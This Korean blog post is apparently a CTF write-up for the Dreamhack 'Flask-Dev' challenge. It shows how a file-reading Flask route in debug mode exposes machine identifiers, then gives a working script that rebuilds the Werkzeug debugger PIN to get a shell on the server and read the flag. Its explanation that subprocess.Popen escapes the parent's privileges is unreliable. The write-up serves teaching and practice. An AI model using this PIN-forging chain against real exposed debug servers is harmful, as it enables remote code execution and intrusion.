---
layout: post
title: Dreamhack | Flask-Dev
subtitle: Flask-Dev 문제 풀이
categories: Web
tags: [dreamhack, Pentest, Web]
---

**본 문제는 dreamhack.io를 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/fc64c9e3-d857-4b26-acee-b99b109caa0d" width = 850>
</p>

문제에서 제공하는 소스 코드와 로그 파일을 분석하여 FLAG를 찾는 것으로 되어 있다.

처음으로 Level 4에 도전하는 거라 참고의 참고를 거쳐서 겨우 풀게 되었다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/bc394eaa-0aac-4bdb-bc78-ce1209720a06" width = 850>
</p>

접속하면 **Hello !**를 제외한 아무것도 없고 이젠 제공해준 `app.py`를 확인해야 할 것으로 보인다.

### 문제 풀이

```python
#!/usr/bin/python3
from flask import Flask
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

@app.route('/')
def index():
	return 'Hello !'

@app.route('/<path:file>')
def file(file):
	return open(file).read()

app.run(host='0.0.0.0', port=8000, threaded=True, debug=True)
```

`/` 루트 디렉토리 진입 시 단순히 해당 스트링을 출력해주고

파일 경로를 입력할 경우 해당 파일의 내용을 출력해주는 시스템이다.

하지만 `app.run`을 보면 디버그 모드가 켜져 있는 것을 알 수 있다.

Flask 개발 시 Debug 모드로 진행하지 않은 경우 변경사항이 있을 때 서버를 껐다 켰다 다시 실행해주는 번거로움이 있기에 이러한 모드가 존재한다.

이 Debug 모드를 통해 서버와의 통신이 가능하다 !

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/e2ba3a9a-dbc8-46fa-b824-c1fb1f152d5c" width = 850>
</p>

`/flag`에 존재한다길래 접근했을 때 파일을 읽지 못해서 에러가 발생하는 것을 알 수 있다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/5d239aa8-2b4f-4b89-bc0f-f238d11614f1" width = 550>
</p>

해당 에러 MouseFocusOn 상태로 우측을 보면 터미널에 `Open an interactive python shell in this frame`가 있음을 알 수 있고 이를 클릭하면 PIN 번호가 필요하다고 한다.

이 PIN 코드를 입력하면 대화형 python shell이 실행되고 이를 통해 flag를 읽을 수 있다.

debugger PIN을 생성하는 코드를 `/usr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py`에 존재하기에 **LFI**을 해보도록 한다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/dae166a6-4b1b-4004-9162-c7e764b5fcf8" width = 850>
</p>

```python
@app.route('/<path:file>')
def file(file):
	return open(file).read()
```

해당 코드덕에 **LFI**를 통한 파일 접근이 아래처럼 가능하다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/dbdde213-0ea4-41d4-b4c8-415d64c9c415" width = 850>
</p>


코드 Beautify 이후 중요한 코드만 일부 가져온 것이다.

```python
def get_machine_id():
    global _machine_id
    if _machine_id is not None:
        return _machine_id

    def _generate():
        linux = b""
        # machine-id is stable across boots, boot_id is not.
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except IOError:
                continue
            if value:
                linux += value
                break
        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("/proc/self/cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except IOError:
            pass

probably_public_bits = [
    username,
    modname,
    getattr(app, "__name__", app.__class__.__name__),
    getattr(mod, "__file__", None),
]

private_bits = [str(uuid.getnode()), get_machine_id()]
```

이 두 값이 있어야 `debugger PIN`을 만들 수 있다. 이 두 값은 **LFI** 취약점이 발생한 순간 모두 구할 수 있다.

* `username` : app.py를 실행한 사용자 이름

* `modname` : flask.app

* `getattr(app, "__name__", app.__class__.__name__)` : Flask

* `getattr(mod, "__file__", None)` : flask 폴더에 app.py 절대 경로

* `uuid.getnode()` : 해당 PC의 MAC 주소

* `get_machine_id()` : 함수 내용 확인

    * `/etc/machine-id` 파일 값 or `/proc/sys/kernel/random/boot_id` 파일 값 + `/proc/self/cgroup` 파일 값이 return 값
            
#### 자료 수집

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/6629d051-2a9a-44c7-90e6-57941776f386" width = 650>
</p>

* `username` : **dreamhack**

* `modname` : **flask.app**

* `getattr(app, "__name__", app.__class__.__name__)` : **Flask**

* `getattr(mod, "__file__", None)` : 맨 처음에 app.py 가져온 경로 **/usr/local/lib/python3.8/site-packages/flask/app.py**

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/43bbc5ce-1acb-45e4-9bb3-bfc777c8320a" width = 650>
</p>

* `uuid.getnode()` : 해당 PC의 MAC 주소 `/sys/class/net/eth0/address` **aa:fc:00:00:2a:01**

    * 10진수로 할 경우 : **187999308491265**

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/db7a65ca-56ef-496c-bde8-7ea5aec5d2de" width = 650>
</p>

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/efa4e4e4-9a9a-43a6-b988-eb6be2ae0d5f" width = 650>
</p>

* `get_machine_id()` : `/etc/machine-id` 파일 값  + `/proc/self/cgroup` 파일 값 

    * **c31eea55a29431535ff01de94bdcf5cflibpod-eb9d4cb835460a3375a8a1149ca6f62c3b2e33a3c08b92007c95330cd8f6b05e**

#### PIN 생성

`__init__.py` 내에 존재하는 `get_pin_and_cookie_name()` PIN 생성 함수를 사용하여 만들 수 있다.

```python
import hashlib
from itertools import chain

def get_pin_and_cookie_name():
    probably_public_bits = [
        'dreamhack',
        'flask.app',
        'Flask',
        '/usr/local/lib/python3.8/site-packages/flask/app.py',
    ]

    private_bits = [
        '187999308491265',
        b'c31eea55a29431535ff01de94bdcf5cflibpod-eb9d4cb835460a3375a8a1149ca6f62c3b2e33a3c08b92007c95330cd8f6b05e'
    ]

    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = "__wzd" + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b"pinsalt")
        num = ("%09d" % int(h.hexdigest(), 16))[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = "-".join(
                    num[x : x + group_size].rjust(group_size, "0")
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    print(rv)

if __name__ == '__main__':
    get_pin_and_cookie_name()
```

생성된 PIN 코드를 이용해 대입하면 아래처럼 명령어 삽입이 가능하고 FLAG를 획득할 수 있다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/b657faec-0e29-4952-8786-12104c50c9e9" width = 650>
</p>

단순 `f = open('flag')`을 이용해서 read하려고 했으나 **PermissionError: [Errno 13] Permission denied: '/flag'**에러가 발생했었다.

현재 flask의 user는 **dreamhack**으로 `/` root 권한이 없기에 불가능 했었다.

`subprocess.Popen`은 프로세스를 실행할 때 일반적으로 부모 프로세스의 권한을 상속받지 않고 별도의 프로세스로 실행됩니다. 

따라서 해당 프로세스가 요구하는 권한과 관련하여 부모 프로세스의 권한과는 독립적으로 동작할 수 있기에 이를 이용하여 FLAG를 읽은 것이다.

* 참고 : [Universe Blog](https://lactea.kr/entry/python-flask-debugger-pin-find-and-exploit)